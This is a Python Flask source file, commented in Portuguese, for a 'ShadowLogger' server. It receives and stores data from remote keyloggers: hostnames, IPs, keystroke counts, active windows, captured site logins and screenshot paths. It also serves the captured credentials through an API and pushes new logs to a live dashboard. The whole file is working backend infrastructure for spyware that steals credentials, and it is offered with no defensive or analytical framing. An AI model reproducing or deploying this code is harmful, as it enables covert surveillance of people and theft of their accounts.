#!/usr/bin/env python3
"""ShadowLogger Web Server — Dashboard para monitoramento remoto."""

import os
import json
from datetime import datetime
from flask import Flask, jsonify, render_template, request
from flask_socketio import SocketIO, emit
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
socketio = SocketIO(app)

# Configuração do banco de dados
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get(
    'DATABASE_URL', 'sqlite:///shadow.db'
)
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Models
class Log(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    keys_pressed = db.Column(db.Integer, default=0)
    words_typed = db.Column(db.Integer, default=0)
    active_window = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class Credential(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(100))
    site = db.Column(db.String(100))
    login = db.Column(db.String(200))
    password = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class Screenshot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(100))
    filepath = db.Column(db.String(300))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/status')
def status():
    return jsonify({
        "status": "online",
        "uptime": (datetime.now() - app.start_time).total_seconds(),
        "clients": db.session.query(Log).count()
    })

@app.route('/api/log', methods=['POST'])
def log():
    data = request.json
    log_entry = Log(
        hostname=data.get("hostname"),
        ip=data.get("ip"),
        keys_pressed=data.get("keys_pressed", 0),
        words_typed=data.get("words_typed", 0),
        active_window=data.get("active_window", "Unknown"),
        timestamp=datetime.fromisoformat(data.get("timestamp", datetime.now().isoformat()))
    )
    db.session.add(log_entry)
    db.session.commit()

    # Salva credenciais se houver
    for cred in data.get("credentials", []):
        c = Credential(
            hostname=data.get("hostname"),
            site=cred.get("context", "Unknown"),
            login=cred.get("key", "N/A"),
            password="•" * 8,
            timestamp=datetime.fromisoformat(cred.get("timestamp", datetime.now().isoformat()))
        )
        db.session.add(c)
    db.session.commit()

    socketio.emit('new_log', data)
    return jsonify({"status": "success"})

@app.route('/api/credentials')
def credentials():
    creds = Credential.query.order_by(Credential.timestamp.desc()).limit(50).all()
    return jsonify([{
        "id": c.id,
        "hostname": c.hostname,
        "site": c.site,
        "login": c.login,
        "password": c.password,
        "timestamp": c.timestamp.isoformat()
    } for c in creds])

@socketio.on('connect')
def handle_connect():
    emit('status', {'status': 'connected', 'time': datetime.now().isoformat()})

if __name__ == '__main__':
    app.start_time = datetime.now()
    with app.app_context():
        db.create_all()
    socketio.run(app, host='0.0.0.0', port=5000)
